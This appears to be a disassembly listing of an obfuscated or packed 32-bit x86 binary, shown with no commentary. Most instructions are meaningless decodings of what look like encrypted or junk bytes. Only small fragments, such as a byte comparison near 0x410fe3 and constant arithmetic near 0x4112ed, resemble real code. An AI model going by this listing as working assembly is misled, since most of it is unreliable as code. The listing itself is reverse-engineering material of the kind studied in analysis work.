  410c30:	daa    
  410c31:	jne    0x410c11
  410c33:	or     DWORD PTR [edx+eiz*4],ebp
  410c36:	hlt    
  410c37:	shl    ecx,1
  410c39:	push   esp
  410c3a:	scas   al,BYTE PTR es:[edi]
  410c3b:	jbe    0x410c60
  410c3d:	and    al,0xac
  410c3f:	scas   eax,DWORD PTR es:[edi]
  410c40:	jae    0x410caa
  410c42:	mov    bh,0x3d
  410c45:	jbe    0x410c5c
  410c47:	xor    eax,0x3a5fb3e8
  410c4c:	sbb    al,0xe0
  410c4e:	test   ch,ah
  410c50:	pop    esi
  410c51:	or     al,0x1a
  410c53:	sbb    ch,BYTE PTR [edi+edx*4]
  410c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c57:	fnstcw WORD PTR [ebp+0x125d5853]
  410c5d:	arpl   WORD PTR [esi+0xc],ax
  410c60:	inc    edi
  410c61:	sar    ch,1
  410c63:	(bad)  
  410c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c66:	sti    
  410c67:	pop    es
  410c68:	mov    edx,0xbfff09d0
  410c6d:	shl    DWORD PTR [eax+0x46],cl
  410c70:	or     DWORD PTR [ecx+eiz*8],ebp
  410c73:	loope  0x410c2c
  410c75:	xor    bh,0xf1
  410c78:	dec    esp
  410c79:	and    BYTE PTR [ecx+0x7e],ah
  410c7c:	inc    eax
  410c7d:	push   es
  410c7e:	sahf   
  410c7f:	push   esi
  410c80:	iret   
  410c81:	xchg   BYTE PTR [eax],al
  410c83:	addr16 test esp,esi
  410c86:	scas   al,BYTE PTR es:[edi]
  410c87:	ret    
  410c88:	dec    esi
  410c89:	ror    BYTE PTR [eax+ebp*1-0x59db3d24],0x9f
  410c91:	sub    eax,0x1b3089c1
  410c96:	adc    BYTE PTR [esi],dl
  410c98:	and    BYTE PTR [ecx],al
  410c9a:	outs   dx,BYTE PTR ds:[esi]
  410c9b:	je     0x410c7c
  410c9d:	shl    DWORD PTR [eax],cl
  410c9f:	enter  0xebed,0xb3
  410ca3:	add    al,0xdd
  410ca5:	shl    DWORD PTR [ebp+0xf6b46d4],0xf6
  410cac:	inc    eax
  410cad:	sub    al,0x17
  410caf:	inc    ecx
  410cb0:	inc    ecx
  410cb1:	repnz aad 0xeb
  410cb4:	pop    ds
  410cb5:	leave  
  410cb6:	dec    ecx
  410cb7:	sti    
  410cb8:	xchg   edx,eax
  410cb9:	loop   0x410c83
  410cbb:	jle    0x410d32
  410cbd:	xchg   ecx,eax
  410cbe:	rol    ebp,0x6c
  410cc1:	aad    0x85
  410cc3:	adc    esi,DWORD PTR [esi-0x41a3606c]
  410cc9:	jge    0x410c9a
  410ccb:	fcmovnu st,st(7)
  410ccd:	sahf   
  410cce:	enter  0x8e55,0xdf
  410cd2:	pop    ebx
  410cd3:	mov    esp,0xa9b68b3b
  410cd8:	mov    edx,0xfcb35be3
  410cdd:	shr    eax,1
  410cdf:	enter  0xdb41,0xcc
  410ce3:	dec    ebx
  410ce4:	sbb    DWORD PTR [ecx+0x63],0x38bbfe39
  410ceb:	ins    DWORD PTR es:[edi],dx
  410cec:	out    0x8a,eax
  410cee:	mov    WORD PTR [esi-0x5b0d3f40],ss
  410cf4:	(bad)  
  410cf5:	aad    0x8f
  410cf7:	jbe    0x410c93
  410cf9:	fld    DWORD PTR [ebp+0x202bee8e]
  410cff:	sub    DWORD PTR [edi-0x5fd3588f],ebp
  410d05:	jg     0x410d70
  410d07:	adc    edi,edi
  410d09:	adc    DWORD PTR ds:0x8b028958,esp
  410d0f:	inc    ebp
  410d10:	clc    
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xefb7889c
  410d25:	fwait
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d21
  410d2f:	cdq    
  410d30:	fwait
  410d31:	and    ch,ch
  410d33:	mov    ecx,0xd0281d02
  410d38:	push   ecx
  410d39:	xor    BYTE PTR [edx],ch
  410d3b:	pop    ss
  410d3c:	mov    eax,0x6983bcf8
  410d41:	push   0xffffffc4
  410d43:	xchg   esp,eax
  410d44:	stos   BYTE PTR es:[edi],al
  410d45:	adc    eax,0x50a1a44b
  410d4a:	lock and eax,0x7ac1f689
  410d50:	jmp    0xf6a5:0x5c8a23c1
  410d57:	rcr    DWORD PTR [edi],1
  410d59:	add    eax,0xd83ba9ee
  410d5e:	les    esp,FWORD PTR [edi+esi*1+0x9533df4]
  410d65:	shr    DWORD PTR [ecx-0x41],0xc0
  410d69:	sub    eax,0xe2d9d82d
  410d6e:	or     DWORD PTR [ecx],edx
  410d70:	in     eax,dx
  410d71:	mov    dl,0x4a
  410d73:	stos   DWORD PTR es:[edi],eax
  410d74:	xchg   ebp,eax
  410d75:	xor    DWORD PTR [edi+0x6985d61f],ebp
  410d7b:	test   DWORD PTR [ecx-0x903eb23],ebx
  410d81:	dec    ebx
  410d82:	ret    
  410d83:	mov    ebp,0x77254607
  410d88:	xchg   ebp,eax
  410d89:	loop   0x410df2
  410d8b:	bound  esi,QWORD PTR [ecx+ebx*4+0xf3789e8]
  410d92:	jbe    0x410d41
  410d94:	pop    esi
  410d95:	xor    BYTE PTR [edi+0x32543051],dl
  410d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d9c:	pop    edx
  410d9d:	mov    bh,0x9f
  410d9f:	rcr    DWORD PTR [eax+ecx*2-0x11],0xc6
  410da4:	gs std 
  410da6:	ds or  cl,dh
  410da9:	or     eax,DWORD PTR fs:[edi+0x5c]
  410dad:	sbb    eax,0x5b9de47a
  410db2:	ins    DWORD PTR es:[edi],dx
  410db3:	pop    ds
  410db4:	clc    
  410db5:	loop   0x410d6e
  410db7:	mov    WORD PTR [esi],fs
  410db9:	push   ebp
  410dba:	dec    ebp
  410dbb:	add    al,BYTE PTR [esi]
  410dbd:	lds    ebp,FWORD PTR [eax]
  410dbf:	sub    al,0x35
  410dc1:	lds    ebx,FWORD PTR [esi]
  410dc3:	xchg   esi,eax
  410dc4:	rcr    edi,cl
  410dc6:	(bad)  
  410dc7:	sti    
  410dc8:	retf   0xff66
  410dcb:	cmp    eax,0x71d3dcd0
  410dd0:	ds inc ebp
  410dd2:	loopne 0x410dab
  410dd4:	sbb    BYTE PTR [edi+0x58],bh
  410dd7:	push   esp
  410dd8:	or     ecx,DWORD PTR [ebx+0x2f58ade0]
  410dde:	ror    BYTE PTR [eax+eax*8-0x49d85357],cl
  410de5:	and    esp,eax
  410de7:	sbb    ah,bl
  410de9:	dec    edi
  410dea:	adc    BYTE PTR [eax+0x10fb82e2],dl
  410df0:	sbb    ch,BYTE PTR [ecx-0x33]
  410df3:	jbe    0x410d87
  410df5:	icebp  
  410df6:	mov    al,ds:0x937e6d1f
  410dfb:	dec    eax
  410dfc:	loop   0x410df3
  410dfe:	loop   0x410e56
  410e00:	fwait
  410e01:	cmp    ah,ch
  410e03:	or     DWORD PTR [esi+0x24],ebx
  410e06:	iret   
  410e07:	iret   
  410e08:	neg    DWORD PTR [esi]
  410e0a:	outs   dx,BYTE PTR ds:[esi]
  410e0b:	cmp    al,0x43
  410e0d:	std    
  410e0e:	jb     0x410e8f
  410e10:	mov    ebp,DWORD PTR [eax-0x2b]
  410e13:	push   ds
  410e14:	push   0xaef418e2
  410e19:	jle    0x410e45
  410e1b:	xlat   BYTE PTR ds:[ebx]
  410e1c:	and    BYTE PTR [esi-0x19198dd6],0x90
  410e23:	mov    cl,0xd4
  410e25:	mov    WORD PTR [ecx+0x1879d159],gs
  410e2b:	jecxz  0x410dfd
  410e2d:	mov    esp,0x2fb282c3
  410e32:	pop    ecx
  410e33:	stos   DWORD PTR es:[edi],eax
  410e34:	(bad)  
  410e35:	jne    0x410e39
  410e37:	adc    eax,0x89b77432
  410e3c:	lds    ecx,FWORD PTR [esi]
  410e3e:	push   es
  410e3f:	mov    bl,0xd2
  410e41:	cmp    ebx,ebx
  410e43:	loopne 0x410dd5
  410e45:	mov    ds:0xbce073e4,eax
  410e4a:	icebp  
  410e4b:	mov    DWORD PTR [esi],ebx
  410e4d:	mov    ds:0x1c2ba5ac,eax
  410e52:	fimul  DWORD PTR [ecx-0x653e5ccd]
  410e58:	and    ah,al
  410e5a:	ins    DWORD PTR es:[edi],dx
  410e5b:	(bad)  [esi+0xecb1fc5]
  410e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e62:	es push ds
  410e64:	fst    st(5)
  410e66:	xchg   BYTE PTR [ecx-0x67],cl
  410e69:	mov    dl,0x1d
  410e6b:	lods   eax,DWORD PTR ds:[esi]
  410e6c:	nop
  410e6d:	sub    al,0x7c
  410e6f:	cwde   
  410e70:	adc    al,0xf
  410e72:	in     eax,dx
  410e73:	push   edi
  410e74:	mov    ds:0x1a0babbe,eax
  410e79:	ret    
  410e7a:	test   BYTE PTR [edi],cl
  410e7c:	retf   
  410e7d:	pop    ds
  410e7e:	fadd   QWORD PTR [esi]
  410e80:	adc    al,0xec
  410e82:	pop    ss
  410e83:	mov    al,0x98
  410e85:	dec    ecx
  410e86:	fcmovu st,st(2)
  410e88:	es int3 
  410e8a:	pop    esi
  410e8b:	adc    esp,DWORD PTR [edx]
  410e8d:	sbb    edi,DWORD PTR [ebx]
  410e8f:	and    ebx,esp
  410e91:	sbb    dl,BYTE PTR [edx-0x4a]
  410e94:	rcr    BYTE PTR [edx],0xc0
  410e97:	add    ebx,esp
  410e99:	(bad)  [esi]
  410e9b:	push   es
  410e9c:	out    0x2f,eax
  410e9e:	sub    eax,0x7ddc7abe
  410ea3:	push   eax
  410ea4:	cli    
  410ea5:	out    0xd,eax
  410ea7:	fwait
  410ea8:	ins    BYTE PTR es:[edi],dx
  410ea9:	clc    
  410eaa:	das    
  410eab:	jle    0x410e51
  410ead:	push   esp
  410eae:	dec    edi
  410eaf:	imul   ecx,esp,0x44fbcd6e
  410eb5:	call   0xeb87:0x9fd2b21e
  410ebc:	dec    ebp
  410ebd:	and    DWORD PTR [ebp+0x52dbc5be],ebp
  410ec3:	mov    al,ds:0x9535954a
  410ec8:	inc    ecx
  410ec9:	outs   dx,BYTE PTR ds:[esi]
  410eca:	fbld   TBYTE PTR [edx+0x47]
  410ecd:	push   ss
  410ece:	popa   
  410ecf:	ret    
  410ed0:	fidivr WORD PTR [edi-0x50002b71]
  410ed6:	cmp    BYTE PTR [edi],0x6d
  410ed9:	stos   BYTE PTR es:[edi],al
  410eda:	push   edx
  410edb:	ret    
  410edc:	cmp    ebx,DWORD PTR [esi-0xd]
  410edf:	and    DWORD PTR [eax+0x6d6f2d0f],0xe
  410ee6:	pop    es
  410ee7:	push   edx
  410ee8:	dec    ebx
  410ee9:	pop    ecx
  410eea:	inc    eax
  410eeb:	aam    0xcb
  410eed:	daa    
  410eee:	int    0xef
  410ef0:	xor    al,0xb6
  410ef2:	xchg   edx,eax
  410ef3:	call   0x4069bae3
  410ef8:	dec    esi
  410ef9:	or     eax,0xe237c59b
  410efe:	xchg   ecx,eax
  410eff:	jo     0x410ed0
  410f01:	xchg   ebx,eax
  410f02:	mov    al,cl
  410f04:	dec    BYTE PTR [edi]
  410f06:	sar    dh,cl
  410f08:	je     0x410f16
  410f0a:	mov    ecx,0xaac52889
  410f0f:	retf   
  410f10:	or     ah,al
  410f12:	or     BYTE PTR [esi],al
  410f14:	retf   0x5019
  410f17:	sbb    bh,BYTE PTR [ecx+0xe]
  410f1a:	and    edi,eax
  410f1c:	mov    al,ds:0xd3d22f3e
  410f21:	fild   QWORD PTR [ebp+0x4a]
  410f24:	fiadd  WORD PTR [edx]
  410f26:	jl     0x410f44
  410f28:	les    esi,FWORD PTR [edx]
  410f2a:	int    0xd7
  410f2c:	or     DWORD PTR [eax],eax
  410f2e:	pusha  
  410f2f:	mov    eax,0x269c2435
  410f34:	fdivp  st(2),st
  410f36:	xchg   BYTE PTR ds:0x7e4add83,ah
  410f3c:	data16 stc 
  410f3e:	add    al,0x31
  410f40:	icebp  
  410f41:	xchg   edx,eax
  410f42:	fs inc esp
  410f44:	add    ch,BYTE PTR [edi+ebx*4+0x1b]
  410f48:	int3   
  410f49:	out    dx,al
  410f4a:	int3   
  410f4b:	inc    ebx
  410f4c:	lds    eax,FWORD PTR [edi-0x4d03a430]
  410f52:	stc    
  410f53:	inc    esp
  410f54:	and    esp,DWORD PTR [eax+0x29]
  410f57:	mov    eax,ds:0x5e511cf
  410f5c:	test   eax,0xd5551ce9
  410f61:	fist   WORD PTR [ecx-0x68]
  410f64:	jo     0x410fb3
  410f66:	cmp    BYTE PTR [edi],dl
  410f68:	data16 out dx,al
  410f6a:	push   0x3db71394
  410f6f:	jmp    0xb1945b66
  410f74:	sahf   
  410f75:	inc    edx
  410f76:	rol    DWORD PTR [edi+0x44],1
  410f79:	stos   DWORD PTR es:[edi],eax
  410f7a:	push   0x57
  410f7c:	pushf  
  410f7d:	or     ecx,0xffffff91
  410f80:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  410f82:	(bad)  
  410f83:	xchg   esi,eax
  410f84:	ins    DWORD PTR es:[edi],dx
  410f85:	jns    0x410f7d
  410f87:	mov    al,0xa8
  410f89:	pushf  
  410f8a:	mov    ds:0xb3ebb0b1,eax
  410f8f:	push   ss
  410f90:	lds    esp,FWORD PTR [edi]
  410f92:	cmp    al,0xeb
  410f94:	popa   
  410f95:	js     0x410fea
  410f97:	push   es
  410f98:	xchg   BYTE PTR [ecx],ah
  410f9a:	int    0x9b
  410f9c:	mov    BYTE PTR [edx],ch
  410f9e:	dec    edi
  410f9f:	inc    edx
  410fa0:	push   ebp
  410fa1:	mul    ah
  410fa3:	xchg   esi,eax
  410fa4:	jl     0x410f51
  410fa6:	mov    WORD PTR [edi],cs
  410fa8:	dec    eax
  410fa9:	push   ecx
  410faa:	push   eax
  410fab:	sbb    dh,dl
  410fad:	div    DWORD PTR [eax-0x64]
  410fb0:	out    0x6,eax
  410fb2:	sar    DWORD PTR [ecx-0x40369f3a],cl
  410fb8:	pusha  
  410fb9:	mov    DWORD PTR [edx],ebp
  410fbb:	pop    ss
  410fbc:	add    DWORD PTR [esi+0x58],ebx
  410fbf:	pop    edx
  410fc0:	xor    BYTE PTR [ecx],0x4
  410fc3:	sub    eax,0xcb610dd7
  410fc8:	ja     0x41102a
  410fca:	dec    edx
  410fcb:	push   es
  410fcc:	xor    eax,0x9d89013f
  410fd1:	out    0x6a,eax
  410fd3:	jmp    0xe818:0xb9e766fc
  410fda:	cs xchg ebp,eax
  410fdc:	mov    ebx,0xc1339a3a
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411077
  41102b:	mov    ah,0xbe
  41102d:	and    eax,0x7e7e4718
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x410ff2
  411037:	(bad)  
  411038:	mov    esp,0x35e0e95e
  41103d:	jb     0x411066
  41103f:	call   0xd104dde3
  411044:	popa   
  411045:	jno    0x41107a
  411047:	ret    0xa81f
  41104a:	popf   
  41104b:	mov    al,0xa2
  41104d:	mov    bl,0xfc
  41104f:	jno    0x4110a7
  411051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411052:	test   al,0xb2
  411054:	loope  0x41100c
  411056:	icebp  
  411057:	stc    
  411058:	jge    0x411027
  41105a:	mov    ds:0x9ee4b6ed,eax
  41105f:	xchg   esi,eax
  411060:	pop    ecx
  411061:	mov    edi,ecx
  411063:	mov    edx,0xb7ee672
  411068:	and    eax,DWORD PTR [ebp-0x342f6ed0]
  41106e:	pop    eax
  41106f:	xor    BYTE PTR [edx+0x4f],bh
  411072:	xor    al,0xd4
  411074:	not    BYTE PTR [edx]
  411076:	xchg   edi,eax
  411077:	jbe    0x4110b2
  411079:	shr    ah,cl
  41107b:	pusha  
  41107c:	sub    ecx,DWORD PTR [edi+eax*2-0x3db04422]
  411083:	enter  0x54b3,0x7
  411087:	xchg   esi,eax
  411088:	inc    esp
  411089:	or     edx,DWORD PTR [ecx+0x725a57ee]
  41108f:	sub    DWORD PTR [ecx+eiz*4+0x4b3d3300],esi
  411096:	mov    ebx,0xd87cd44a
  41109b:	sub    edi,ecx
  41109d:	mov    edx,0xdf62f645
  4110a2:	inc    esi
  4110a3:	sub    eax,0xe8d82c0e
  4110a8:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4110aa:	jmp    0x705c:0xa475e0e1
  4110b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110b2:	fcmovbe st,st(0)
  4110b4:	test   BYTE PTR [eax],0xd3
  4110b7:	cmp    al,0x6f
  4110b9:	mov    ebx,0x7040090e
  4110be:	adc    DWORD PTR [edx-0x1bade5f1],ebx
  4110c4:	adc    DWORD PTR [ecx+0x19],esp
  4110c7:	imul   esi,DWORD PTR [edi-0xe],0x70
  4110cb:	xor    BYTE PTR [esi-0x5c96cfe0],cl
  4110d1:	inc    esi
  4110d2:	sub    eax,0x55dbc8be
  4110d7:	stos   DWORD PTR es:[edi],eax
  4110d8:	js     0x4110e8
  4110da:	inc    esi
  4110db:	mov    esi,0x24ed57b5
  4110e0:	mov    eax,0xb4514f16
  4110e5:	fdiv   DWORD PTR [eax]
  4110e7:	aad    0xa9
  4110e9:	push   es
  4110ea:	(bad)  
  4110eb:	out    0xab,eax
  4110ed:	ins    DWORD PTR es:[edi],dx
  4110ee:	add    edi,DWORD PTR [eax+0x4a]
  4110f1:	push   eax
  4110f2:	add    eax,0x3fed79e6
  4110f7:	push   edi
  4110f8:	sbb    eax,0x5e5e88bc
  4110fd:	or     ebx,DWORD PTR [esi+0x64]
  411100:	in     eax,0xca
  411102:	add    eax,0x4458fcd4
  411107:	sub    al,0x10
  411109:	mov    edx,0xe1a7f108
  41110e:	adc    eax,0x78843fe1
  411113:	push   cs
  411114:	pop    ds
  411115:	adc    eax,0x25db393d
  41111a:	adc    al,0xde
  41111c:	mov    al,ds:0x5c75babf
  411121:	mov    al,ds:0x1a126b18
  411126:	jno    0x4111a6
  411128:	push   ecx
  411129:	addr16 repnz inc esp
  41112c:	jbe    0x41116a
  41112e:	shl    DWORD PTR [edi+0x1e],1
  411131:	xlat   BYTE PTR ds:[ebx]
  411132:	jne    0x41113c
  411134:	sbb    cl,bl
  411136:	pop    ebx
  411137:	scas   eax,DWORD PTR es:[edi]
  411138:	push   0xf1ee1b60
  41113d:	addr16 stc 
  41113f:	popf   
  411140:	jmp    0x8724:0x2a451b2f
  411147:	iret   
  411148:	xor    ch,ch
  41114a:	pop    ss
  41114b:	(bad)
  41114e:	inc    edi
  41114f:	jp     0x41119f
  411151:	mov    eax,ds:0xee60e374
  411156:	inc    edx
  411157:	stos   BYTE PTR es:[edi],al
  411158:	sbb    ebp,DWORD PTR [edx]
  41115a:	cs jne 0x4111d5
  41115d:	hlt    
  41115e:	pop    ecx
  41115f:	jno    0x41112a
  411161:	or     si,dx
  411164:	dec    eax
  411165:	mov    al,0x16
  411167:	(bad)  
  411169:	repz adc eax,0x58462148
  41116f:	sbb    cl,BYTE PTR [esi+ebx*2+0x49427e08]
  411176:	imul   ebp,DWORD PTR [esi+0x75],0x2af0234d
  41117d:	je     0x411134
  41117f:	pop    esi
  411180:	push   ds
  411181:	ss pop esi
  411183:	inc    edx
  411184:	dec    esi
  411185:	push   DWORD PTR [ebx+0x6d9531ff]
  41118b:	sbb    eax,0xba992550
  411190:	xchg   esp,eax
  411191:	jne    0x411187
  411193:	test   al,0x34
  411195:	mov    dl,BYTE PTR [ecx]
  411197:	mov    DWORD PTR [ebp+0x55653b77],0xb0e84b06
  4111a1:	les    ecx,FWORD PTR ds:0x3f152e
  4111a7:	ins    BYTE PTR es:[edi],dx
  4111a8:	(bad)  
  4111a9:	mov    edx,0x35901328
  4111ae:	and    bl,cl
  4111b0:	mov    bh,0x1f
  4111b2:	xchg   DWORD PTR [ebx-0x6d],ecx
  4111b5:	push   esp
  4111b6:	adc    DWORD PTR [ebx+0x22],edx
  4111b9:	sub    BYTE PTR [edx+0x72],ch
  4111bc:	push   ebp
  4111bd:	loop   0x4111d3
  4111bf:	or     ah,bl
  4111c1:	push   esp
  4111c2:	call   0xe68dc0c2
  4111c7:	test   dh,bh
  4111c9:	ds xchg edx,eax
  4111cb:	xor    BYTE PTR [eax-0x47],0x41
  4111cf:	mov    cl,ch
  4111d1:	sub    eax,0x879a0629
  4111d6:	jmp    0xbe923e0
  4111db:	div    BYTE PTR [edi+0x36]
  4111de:	nop
  4111df:	imul   edi,DWORD PTR [ebp-0x13df3a63],0xc545f95e
  4111e9:	jge    0x411218
  4111eb:	int    0x8a
  4111ed:	sbb    al,0x7b
  4111ef:	jb     0x4111ba
  4111f1:	xchg   edi,eax
  4111f2:	pop    eax
  4111f3:	or     al,dh
  4111f5:	and    al,0xf5
  4111f7:	loop   0x4111b1
  4111f9:	scas   eax,DWORD PTR es:[edi]
  4111fa:	gs out dx,eax
  4111fc:	ins    DWORD PTR es:[edi],dx
  4111fd:	gs push esp
  4111ff:	test   DWORD PTR [ecx],eax
  411201:	xchg   ebp,eax
  411202:	or     al,0xca
  411204:	adc    ah,al
  411206:	ins    DWORD PTR es:[edi],dx
  411207:	mov    es,WORD PTR [ecx+0x2d1c2516]
  41120d:	retf   0x9090
  411210:	xchg   ebp,eax
  411211:	cmp    DWORD PTR [eax],edx
  411213:	jb     0x41122e
  411215:	jge    0x4111d8
  411217:	sbb    BYTE PTR [ebp-0x3910af9c],bl
  41121d:	dec    esp
  41121e:	arpl   WORD PTR [edx-0x59],cx
  411221:	push   esi
  411222:	imul   esi,edi,0x54
  411225:	(bad)  
  411226:	mov    al,0xae
  411228:	test   DWORD PTR [edi],esp
  41122a:	hlt    
  41122b:	call   0x1816:0xef274af3
  411232:	jmp    0xdd0399f6
  411237:	xchg   esi,eax
  411238:	or     ecx,DWORD PTR [ecx]
  41123a:	outs   dx,BYTE PTR ds:[esi]
  41123b:	xchg   BYTE PTR [ecx-0x5bc2a33c],bh
  411241:	test   BYTE PTR [ebp-0xb],bl
  411244:	loope  0x4112ba
  411246:	xchg   DWORD PTR [ecx+0x48],ebx
  411249:	loopne 0x41129d
  41124b:	mov    edx,esp
  41124d:	retf   0xca84
  411250:	out    0xa2,al
  411252:	(bad)  
  411254:	cmp    eax,0x5c15a3cd
  411259:	test   eax,0x9f0a3e9b
  41125e:	out    dx,eax
  41125f:	jmp    0x3e37:0xbd4fc586
  411266:	jle    0x411229
  411268:	or     dh,BYTE PTR [edx-0x3a1e17f3]
  41126e:	(bad)  
  41126f:	mov    eax,0x62b60b00
  411274:	pushf  
  411275:	pop    eax
  411276:	inc    ecx
  411277:	ret    
  411278:	clc    
  411279:	mov    ecx,0x86b46bf1
  41127e:	mov    esi,0xa30a627a
  411283:	mov    BYTE PTR [ebx],bl
  411285:	lods   al,BYTE PTR ds:[esi]
  411286:	pop    edx
  411287:	pop    ds
  411288:	retf   
  411289:	jo     0x4112f0
  41128b:	mov    bh,0xdd
  41128d:	imul   ecx,DWORD PTR [edx+0x34],0x1d196794
  411294:	adc    ecx,esi
  411296:	add    DWORD PTR [edx-0x6f],esi
  411299:	fprem  
  41129b:	hlt    
  41129c:	call   0xdd178e3
  4112a1:	xlat   BYTE PTR ds:[ebx]
  4112a2:	pop    ebp
  4112a3:	call   0x62e9:0x348218f9
  4112aa:	xor    bl,dl
  4112ac:	dec    ebx
  4112ad:	retf   0x1287
  4112b0:	lahf   
  4112b1:	in     eax,0xc6
  4112b3:	ret    0x3e79
  4112b6:	cmc    
  4112b7:	xlat   BYTE PTR ds:[ebx]
  4112b8:	call   0x13a3ec97
  4112bd:	cmc    
  4112be:	and    DWORD PTR [edi-0x2cac5fc2],ebp
  4112c4:	add    edx,DWORD PTR [esi-0x46]
  4112c7:	(bad)  
  4112c8:	inc    di
  4112ca:	inc    eax
  4112cb:	xor    ebx,0xe4a3fc63
  4112d1:	leave  
  4112d2:	ja     0x4112d3
  4112d4:	(bad)  
  4112d5:	fwait
  4112d6:	clc    
  4112d7:	bound  edx,QWORD PTR [ecx-0x6f]
  4112da:	out    0x44,al
  4112dc:	hlt    
  4112dd:	repnz pop eax
  4112df:	lds    ebx,FWORD PTR [ebp-0x3da97f59]
  4112e5:	dec    DWORD PTR [edi+ecx*1-0x7c]
  4112e9:	inc    BYTE PTR [edx]
  4112eb:	add    BYTE PTR [eax],al
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0xc868f61e,eax
  411318:	stc    
  411319:	xchg   esi,eax
  41131a:	popf   
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x41139f
  411324:	push   eax
  411325:	mov    edx,0x6c6d034b
  41132a:	fwait
  41132b:	or     ebx,DWORD PTR [ebp+eiz*4-0x25ee28f1]
  411332:	pusha  
  411333:	pop    edi
  411334:	in     al,0x7d
  411336:	or     dl,BYTE PTR [ebx-0x3d8a98ef]
  41133c:	bound  ebp,QWORD PTR [eax-0x5df073a0]
  411342:	mov    al,BYTE PTR [ecx+eiz*2]
  411345:	ins    BYTE PTR es:[edi],dx
  411346:	jmp    0x6737:0x97924b1c
  41134d:	and    BYTE PTR cs:[eax+0x5361368d],bl
  411354:	push   eax
  411355:	push   es
  411356:	cld    
  411357:	pusha  
  411358:	stos   BYTE PTR es:[edi],al
  411359:	add    ah,dh
  41135b:	nop
  41135c:	dec    ecx
  41135d:	cmp    esp,ecx
  41135f:	ins    DWORD PTR es:[edi],dx
  411360:	test   eax,0x60e0623f
  411365:	fnstsw WORD PTR [esi]
  411367:	push   0xfd86504
  41136c:	mov    dh,0xaa
  41136e:	call   0xa9d7beff
  411373:	mov    WORD PTR [ecx+0x2ac036e6],ds
  411379:	xchg   edi,eax
  41137a:	(bad)  
  41137b:	and    edx,ebx
  41137d:	dec    ecx
  41137e:	cli    
  41137f:	shl    DWORD PTR [ecx],cl
  411381:	mov    DWORD PTR [edx],eax
  411383:	add    bh,bl
  411385:	inc    edx
  411386:	push   cs
  411387:	pop    eax
  411388:	fistp  QWORD PTR [ecx+eax*2+0x52]
  41138c:	leave  
  41138d:	pop    es
  41138e:	jmp    0xa3a9d941
  411393:	add    BYTE PTR [ecx],cl
  411395:	mov    eax,DWORD PTR [esi-0x60]
  411398:	fs pusha 
  41139a:	sbb    BYTE PTR fs:[esi+0x3f594ea],0x18
  4113a2:	leave  
  4113a3:	cmp    DWORD PTR [ebx],0x4d
  4113a6:	jno    0x4113ee
  4113a8:	pop    esp
  4113a9:	fstp   DWORD PTR [ebx-0x5b19d87a]
  4113af:	imul   edi,esi,0x5c
  4113b2:	fdivp  st(4),st
  4113b4:	je     0x41135b
  4113b6:	call   0xb1164728
  4113bb:	sbb    eax,ebx
  4113bd:	add    BYTE PTR [eax+0x6c617330],cl
  4113c3:	addr16 pop edx
  4113c5:	popf   
  4113c6:	push   ebx
  4113c7:	xor    BYTE PTR [eax-0x39356fdc],al
  4113cd:	adc    cl,dl
  4113cf:	adc    al,0x3f
  4113d1:	test   edx,ebx
  4113d3:	sbb    DWORD PTR ds:0x4e0e3ad1,esp
  4113d9:	mov    ecx,0xcf624b6
  4113de:	sbb    DWORD PTR [esi-0x26],edx
  4113e1:	pushf  
  4113e2:	retf   
  4113e3:	pop    edi
  4113e4:	shl    eax,1
  4113e6:	xlat   BYTE PTR ds:[ebx]
  4113e7:	lahf   
  4113e8:	xchg   ecx,eax
  4113e9:	sbb    bh,ch
  4113eb:	stc    
  4113ec:	or     dh,ch
  4113ee:	sbb    eax,0xed6e14a7
  4113f3:	xchg   edx,eax
  4113f4:	ret    0xa3f1
  4113f7:	daa    
  4113f8:	sub    DWORD PTR [edi+esi*8+0x3aac070a],esp
  4113ff:	or     dl,BYTE PTR [esi]
  411401:	cmp    eax,DWORD PTR ds:0x512855b1
  411407:	xchg   DWORD PTR [ebp-0x5cd031dc],eax
  41140d:	dec    esp
